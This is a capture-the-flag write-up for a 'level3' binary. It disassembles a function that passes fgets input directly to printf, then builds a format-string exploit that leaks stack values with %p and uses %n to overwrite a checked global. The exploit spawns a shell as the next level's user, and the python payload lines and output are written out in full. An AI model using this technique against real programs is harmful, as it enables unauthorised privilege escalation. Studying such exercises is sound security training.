In this level we will be exploiting program using the printf.
Start with 'objdump -d level3':
	080484a4 <v>:
	 80484a4:	55                   	push   %ebp
	 80484a5:	89 e5                	mov    %esp,%ebp
	 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
	 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
	 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
	 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
	 80484bd:	00
	 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
	 80484c4:	89 04 24             	mov    %eax,(%esp)
	 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
	 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
	 80484d2:	89 04 24             	mov    %eax,(%esp)
	 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
	 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
	 80484df:	83 f8 40             	cmp    $0x40,%eax
	 80484e2:	75 34                	jne    8048518 <v+0x74>
	 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
	 80484e9:	89 c2                	mov    %eax,%edx
	 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
	 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
	 80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
	 80484fb:	00
	 80484fc:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
	 8048503:	00
	 8048504:	89 04 24             	mov    %eax,(%esp)
	 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
	 804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
	 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
	 8048518:	c9                   	leave
	 8048519:	c3                   	ret

	0804851a <main>:
	 804851a:	55                   	push   %ebp
	 804851b:	89 e5                	mov    %esp,%ebp
	 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
	 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
	 8048525:	c9                   	leave
In main program call 'v' function, in which 'fgets' function is called.
After trying to overflow 'fgets' buffer we understood that now 'fgets' is protected.
So proceed with 'printf'. If buffer from 'fgets' is fed to printf directly we may exploit it,
using '%s', '%p' and so on.
Try { python -c "print '%p %p'" | ./level3 }: >> 0x200 0xb7fd1ac0
OK. printf is really not secured. With the flag %n printf may write into passed variable.
We amy abuse this to rewrite 0x804988c which is compared to 0x40 to decide wether jump or not.
Find offset by placing multiple %p after address we want to modify 
{ python -c "print '\x8c\x98\x04\x08' + '%p ' * 6" | /home/user/level3/level3 } : 
>> �0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x25207025 0x70252070
Our address is at 4th position. We want to place 0x40 into that address which is 64 in dec.
We allready placing 4 bytes of address so we only need 60.
python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'" | /home/user/level3/level3
>>�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
>>Wait what?!
But no command line!
I happened because eof was sent to bash after end of our input from python.
To overcome it add cat at the end of python call to continue input:
(python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'"; cat) | /home/user/level3/level3
>>whoami
>>level4
